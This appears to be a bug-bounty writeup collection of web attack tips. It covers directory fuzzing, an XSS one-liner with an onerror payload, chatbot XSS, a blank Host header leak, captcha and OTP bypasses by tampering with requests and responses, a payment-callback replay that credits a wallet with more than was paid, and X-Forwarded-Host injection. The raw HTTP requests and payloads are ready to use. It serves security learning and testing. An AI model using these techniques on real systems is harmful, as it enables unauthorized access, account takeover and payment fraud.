# Writeups (Golden tips)

## Information Disclosure
```bash
# directory fuzzing for sensitive files
dirsearch -u “https://target.com” -t 150 -x 403,404,500,429 -i 200,301,302 --random-agent
```
## Reflected XSS (Non-Persistent XSS)
```bash
# XSS one liner
echo "target.com" | gauplus | grep "?" | qsreplace 'xssz"><img/src=x onerror=confirm(999)><!--' | httpx -mr '"><img/'
```
**What this command do?**

1st it look for urls using a tool called `gauplus` or you can use `waybackurls` or waymore, thes are great tools too to find archived urls, then it get all the urls with parameters and replace all the values of the parameter with the payload `xssz”><img/src=x onerror=confirm(999)><!--` than using `HTTPX` tool it will give you all the request that contain our malicious payload on the responce with no filters.

## The Blank Host Header trick
**Concise tip:** Try to find places in websites where the “host” HTTP header is reflected on the page. If you find this, try a blank host header in the request and the website may leak internal hostnames!

If a site is reflecting the host header in the response even when you it to something like example.com, it may be vulnerable to this. First, you need to change the HTTP protocol on the request from `HTTP/1.1`, the default, to `HTTP/1.0`. This is because empty host headers are invalid in the newer protocol. This is done in different ways depending on how you are replaying this HTTP request, but for example in Burp Repeater, you simply change `HTTP/1.1` in the top line of the request to `HTTP/1.0`. Next, you want to make the `host` HTTP header **blank**, so it looks like `Host:`. Now when you send the request, the response may show an IP address or a weird looking web address where the host header was previously reflected. **99%** of the time this is an **internal hostname or an internal IP address**. These can be used in other exploits to perform attacks on internal infrastructure, so companies generally do not want these leaked!

This is common on `Apache` servers when the bottom line of an error page reads something like **Apache Server at example.com Port 443** because example.com is simply being reflected from the host header in the request.


## Captcha Bypass
1. The following request is related to entering the system:
```html
POST /Auth/LoginWithPasswordCaptcha HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
---snip---

Connection: close{"username":"XXXXX","password":"111111","deviceName":"Netscape-5.0 (Windows)","captchaCode":"acvb","captchaId":"77e148fc-9fb8-48a5-af25-699761fbb223","deviceInfo":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"}
```
2. If the attacker deletes the captcha code variable in the body and changes /Auth/LoginWithPasswordCaptcha to /Auth/LoginWithPassword in the url, the implemented captcha mechanism will be bypassed and the attacker can implement it this way. make a pervasive search attack.
```html
POST /Auth/LoginWithPassword HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
---snip---

Connection: close{"username":"XXXXX","password":"111111","deviceName":"Netscape-5.0 (Windows)","deviceInfo":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"}
```

## OTP Bypass
1. The following request is a request to check the otp in the digital signature section:
```html
POST /SignatureCertificate/CheckOtp HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
---snip---

```
2. If the entered otp is wrong, the following answer will be returned:
```html
HTTP/1.1 400 Bad Request
Server: nginx
Content-Type: application/json; charset=utf-8
Set-Cookie: cookiesession1=678B286C2DE65BDFC274EB1DEB4B88A6;Expires=Tue, 29 Jul 2025 11:54:43 GMT;Path=/;HttpOnly
---snip---

{"isFailed":true,"isSuccess":false,"reasons":[{"message":"Your code has expired! Please get a new code!","metadata":{}}]," errors":[{"reasons":[],"message":"Your code has expired! Please get a new code!","metadata":{}}],"successes":[]}
```
3. If the attacker sets the `isFailed` value to `False` and the `isSuccess` value to `True` in this **response**, he can easily bypass the OTP authentication mechanism without having access to the correct code!

## Wallet Charging Bypass
1. By using this attack, the attacker can pay a smaller amount and charge a larger amount to his wallet by changing the tokens. First, buy 5$ normally in the charging section of the wallet and do not send the call back request, drop it and intercept it:

**Sample call back request**
```html
POST /ResultTransaction?trackingCode=51376940 HTTP/1.1
Host: target.com 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0 
---snip---
 
Token=28907420839252952&OrderId=51376940&TerminalNo=85053207&RRN=743808093455&status=0&HashCardNumber=1AAC1ADAF6CB22AC0D404DBF729427517001DB42EC74282B0A182A2B011968CF&Amount=100%2C000&SwAmount=&STraceNo=400534&DiscoutedProduct=
```
2. Then make a new payment with a higher amount and click cancel at the time of payment and intercept the corresponding call back and put the body of the previous request in this request and finally put the `orderId` of the higher amount request in the request.
3. Final request:
```html
POST /ResultTransaction?trackingCode=51489803 HTTP/1.1
Host: target.com 
---snip---

Token=28907420839252952&OrderId=51489803&TerminalNo=8521900539207&RRN=743807548093455&status=0&HashCardNumber=1AAC1ADAF6CB22AC450D404DBF7294277517001DB42EC74282B0A182A2B011968CF&Amount=100%2C000&SwAmount=&STraceNo=400534&DiscoutedProduct==
```
* Finally, the message of unsuccessful transaction is displayed to the user, but the **wallet is charged successfully**.

## XSS on Chatbot
1. Recon on wildcard target `*.target.com` by `subfinder` and `httpx`
2. Find `https://support.target.com/robots.txt` and then open the `https://support.target.com/` and see a chatbot
3. Send `<u>wearehackerone</u>`
4. Then guess what, it take the HTML tag and **render** it into the box
5. Send `<img src=1 href=1 onerror="javascript:alert(1)">`


![chatbot-xss](https://github.com/user-attachments/assets/0f75b8a4-b890-41e0-b3e0-e17dc450c8cf)



## Host Header Injection
1. After approximately seven hours of continuous hunting, I discovered a subdomain with a URL containing the parameter `path=`
2. My initial thought was to explore potential Server-Side Request Forgery (SSRF) or open redirect vulnerabilities. Despite trying several methods, I was unable to find anything significant.
3. I noticed the presence of the `X-Forwarded-Host` header
4. I initially tested this with apple.com, which resulted in a response redirecting to apple.com. The response header contained the value `Location: https://apple.com/en`. Not finding anything unusual, I carefully examined the response and decided to test further by changing the header value to `evil.com`.
5. To my surprise, instead of blocking the request, the server redirected me to `evil.com`. This indicated a significant **host header injection** vulnerability that could be exploited


![open-redirect](https://github.com/user-attachments/assets/8b4b6362-0b5d-4036-beea-51eff948f627)















